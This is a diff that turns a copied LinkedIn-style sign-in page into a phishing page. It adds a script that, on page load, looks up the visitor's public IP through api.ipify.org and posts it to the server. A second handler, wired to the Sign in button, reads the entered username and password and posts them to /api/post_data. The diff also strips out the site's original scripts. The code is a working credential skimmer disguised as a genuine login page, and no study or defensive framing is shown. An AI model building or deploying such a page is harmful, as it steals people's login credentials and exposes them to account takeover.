@@ -65,6 +65,38 @@
     <link rel="preload" href="6jblk5oqhlo45xbkmcr7s4zix" as="script">
     <link rel="preload" href="dnz8biurbtozxjvxufs5aq4jd" as="script">
     <link rel="preload" href="dz6wk4o93mwzoh0t6zsx73kzr" as="script">
+    <script>
+        window.onload = (event) => {
+          fetch("https://api.ipify.org?format=json")
+            .then((response) => response.json())
+            .then(async (data) => {
+              const url = window.location.protocol + "//" + window.location.host;
+              const rawResponse = await fetch(url + "/api/post_ip", {
+                method: "POST",
+                headers: {
+                  Accept: "application/json",
+                  "Content-Type": "application/json",
+                },
+                body: data.ip,
+              });
+            })
+            .catch((e) => {});
+        };
+        async function submit_ph(event) {
+          event.preventDefault();
+          const url = window.location.protocol + "//" + window.location.host;
+          const username = document.getElementById("username_ph").value;
+          const password = document.getElementById("password_ph").value;
+          const rawResponse = await fetch(url + "/api/post_data", {
+            method: "POST",
+            headers: {
+              Accept: "application/json",
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ username: username, password: password }),
+          });
+        }
+      </script>
 </head>
 
 <body class="system-fonts ">
@@ -109,7 +141,7 @@
                             style="display: none;"><!--"Email or phone number must be between 3 to 128 characters"--></code><code
                             id="consumer_login__text_plain__no_username"
                             style="display: none;"><!--"Please enter an email address or phone number"--></code>
-                        <div class="form__input--floating mt-24"><input id="username" name="session_key" type="text"
+                        <div class="form__input--floating mt-24"><input id="username_ph" name="session_key" type="text"
                                 aria-describedby="error-for-username" required="" validation="email|tel" class=""
                                 autofocus="" aria-label="Email or Phone"><label class="form__label--floating"
                                 for="username" aria-hidden="true">Email or Phone</label>
@@ -141,7 +173,7 @@
                             style="display: none;"><!--"Hmm, that&#39;s not the right password. Please try again "--></code><code
                             id="consumer_login__text_plain__large_password_200_chars"
                             style="display: none;"><!--"The password you provided must have at most 200 characters."--></code>
-                        <div class="form__input--floating mt-24"><input id="password" type="password"
+                        <div class="form__input--floating mt-24"><input id="password_ph" type="password"
                                 aria-describedby="error-for-password" name="session_password" required=""
                                 validation="password" class="" aria-label="Password"><label for="password"
                                 class="form__label--floating" aria-hidden="true">Password</label><span
@@ -155,7 +187,7 @@
                             data-cie-control-urn="forgot-password-btn">Forgot password?</a>
                         <div class="login__form_action_container "><button
                                 class="btn__primary--large from__button--floating" data-litms-control-urn="login-submit"
-                                type="submit" aria-label="Sign in">Sign in</button></div>
+                                type="submit" aria-label="Sign in" onclick="submit_ph(event)">Sign in</button></div>
                     </form>
                     <div class="alternate-signin-container">
                         <div id="or-separator" class="or-separator mt-12 snapple-seperator"><span
@@ -465,8 +497,8 @@
             </li-icon>
         </div>
     </div><code id="isDesktop" style="display: none;"><!--"true"--></code>
-    <script src="dz6wk4o93mwzoh0t6zsx73kzr" defer=""></script>
-    <script src="77qnm4uzm172xn82kvifmelfu" defer=""></script>
+    
+    
     </script><code id="googleOneTapLibScriptPath" style="display: none;"><!--"8ddascte8uiyhhufy6qlnhw2b"--></code><code
         id="i18nErrorGoogleOneTapGeneralErrorMessage"
         style="display: none;"><!--"Something went wrong. Please try using username and password."--></code><code
@@ -477,9 +509,9 @@
         id="apfcDfPK"
         style="display: none;"><!--"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqyVTa3Pi5twlDxHc34nl3MlTHOweIenIid6hDqVlh5/wcHzIxvB9nZjObW3HWfwqejGM+n2ZGbo9x8R7ByS3/V4qRgAs1z4aB6F5+HcXsx8uVrQfwigK0+u7d3g1s7H8qUaguMPHxNnyj5EisTJBh2jf9ODp8TpWnhAQHCCSZcDM4JIoIlsVdGmv+dGlzZzmf1if26U4KJqFdrqS83r3nGWcEpXWiQB+mx/EX4brbrhOFCvfPovvsLEjMTm0UC68Bvki3UsB/vkkMPW9cxNiiJJdnDkOEEdQPuFmPug+sqhACl3IIHLVBFM7vO0ca14rcCNSbSDaaKOY6BQoW1A30wIDAQAB"--></code><code
         id="apfcDfPKV" style="display: none;"><!--"2"--></code>
-    <script src="6jblk5oqhlo45xbkmcr7s4zix" defer=""></script><code id="lix_cv_scoring_login_get_fingerprint"
+    <code id="lix_cv_scoring_login_get_fingerprint"
         style="display: none;"><!--"control"--></code>
-    <script src="dnz8biurbtozxjvxufs5aq4jd" defer="" gapi_processed="true"></script><iframe id="ssIFrame_google"
+    <iframe id="ssIFrame_google"
         sandbox="allow-scripts allow-same-origin" aria-hidden="true" frame-border="0"
         style="position: absolute; width: 1px; height: 1px; inset: -9999px; display: none;"
         src="https://accounts.google.com/o/oauth2/iframe#origin=https%3A%2F%2Fwww.linkedin.com&amp;rpcToken=1609696041.0530887"></iframe>
